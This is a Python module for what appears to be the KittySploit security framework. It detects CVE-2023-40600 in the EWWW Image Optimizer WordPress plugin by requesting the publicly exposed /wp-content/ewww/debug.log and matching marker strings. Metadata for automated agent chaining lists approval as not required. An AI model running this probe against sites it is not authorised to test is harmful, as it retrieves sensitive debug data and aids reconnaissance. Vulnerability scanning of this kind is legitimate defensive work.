#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The EWWW Image Optimizer plugin for WordPress is vulnerable to Sensitive Information Exposure in all versions ."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'EWWW Image Optimizer <= 7.2.0 - Unauthenticated Information Disclosure Detection',
        'description': 'The EWWW Image Optimizer plugin for WordPress is vulnerable to Sensitive Information Exposure in all versions up to, and including, 7.2.0 via the debug_log function. This makes it possible for unauthenticated attackers to extract sensitive debug data when debug logging is enabled.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'wp', 'wordpress', 'wp-plugin', 'ewww-image-optimizer', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2023-40600',
            'https://patchstack.com/database/wordpress/plugin/ewww-image-optimizer/vulnerability/wordpress-ewww-image-optimizer-plugin-7-2-0-sensitive-data-exposure-vulnerability',
            'https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/ewww-image-optimizer/ewww-image-optimizer-720-unauthenticated-sensitive-information-exposure-via-debug-log',
        ],
        'cve': 'CVE-2023-40600',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/ewww/debug.log', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('ewww_image_optimizer', '__construct()',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="EWWW Image Optimizer <= 7.2.0 - Unauthenticated Information Disclosure detected",
                path='/wp-content/ewww/debug.log',
            )
            return True
        return False

